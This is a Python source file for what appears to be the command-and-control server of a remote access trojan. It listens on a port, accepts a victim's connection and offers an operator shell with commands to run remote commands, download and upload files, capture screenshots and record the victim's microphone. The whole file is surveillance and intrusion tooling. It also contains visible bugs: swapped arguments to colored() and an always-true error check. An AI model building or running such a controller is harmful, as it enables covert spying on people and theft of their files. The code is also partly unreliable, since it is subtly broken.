import socket, base64
from termcolor import colored
from socket_handlers import *
from server_commands import *


def run_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(colored("[+] Server Socket Created.", "blue"))
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(colored("[+] Server Is Listening...", "blue"))
    client_socket, client_address = server_socket.accept()
    print(colored(f"[+] Connected To {str(client_address)} Client", "green"))

    while True:
        command = input(colored("shell#~", "light_yellow"))
        if command.rstrip() == "":
            continue
        socket_send(client_socket, command)
        # * Exit Command
        if command == "exit":
            break
        # * cd Command
        if command[:2] == "cd":
            continue
        # * Download Command
        elif command[:8] == "download":
            downloaded_data = handle_download(client_socket, command[9:])
            if not downloaded_data:
                continue
        # * Prt Scr Command
        elif command[:7] == "prt_scr":
            data = handle_screenshot(client_socket)
            if not data:
                continue
        # * Upload Command
        elif command[:6] == "upload":
            uploaded_data = handle_upload(client_socket, command)
            if not uploaded_data:
                continue
        # * Mic Record Command
        elif command[:21] == "mic_record --duration":
            # When receiving mic_record command from client:
            file_path = save_audio(client_socket)
            if not file_path:
                continue
        # * Other Commands
        else:
            data = socket_recv(client_socket)
            if not data.startswith("Error") or not data.startswith("[!]"):
                print(colored("green", data))
            else:
                print(colored("red", data))

    client_socket.close()
    server_socket.close()


if "__main__" == __name__:
    run_server(host="0.0.0.0", port=6018)
